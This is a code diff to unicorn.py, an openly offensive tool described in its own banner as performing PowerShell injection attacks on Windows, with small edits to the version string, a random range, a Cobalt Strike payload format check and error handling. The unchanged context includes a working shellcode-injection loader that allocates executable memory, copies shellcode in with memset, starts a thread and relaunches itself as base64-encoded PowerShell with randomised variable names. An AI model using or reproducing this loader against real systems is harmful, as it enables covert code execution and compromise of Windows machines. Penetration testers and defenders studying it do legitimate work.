@@ -364,7 +364,7 @@ issues.
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.0 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -670,7 +670,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     var9 = "$" + generate_random_string(2, 2) # $g
     var10 = "$" + generate_random_string(2, 2) # $i
     var11 = "$" + generate_random_string(2, 2) # $w
-    var12 = (str(generate_random_number(1001,1024)))
+    var12 = (str(generate_random_number(1001,1010)))
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
@@ -909,8 +909,9 @@ try:
         if attack_type == "cs":
             #if not "char buf[] =" in payload:
             if not "byte[] buf = new byte" in payload:
-                print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
-                sys.exit()
+                if not " byte buf[]" in payload:
+                    print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
+                    sys.exit()
             payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format
             #payload = payload.split(' char buf[] = "')[1].replace("\\x", ",0x").replace(",", "", 1).replace('";', "")
 
@@ -975,4 +976,8 @@ try:
         gen_unicorn()
         gen_usage()
 
-except Exception as e: print("[!] Something went wrong, printing the error: " + str(e))
+except Exception as e:
+    if "list index" in str(e): 
+        print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+    else:   
+        print("[!] Something went wrong, printing the error: " + str(e))
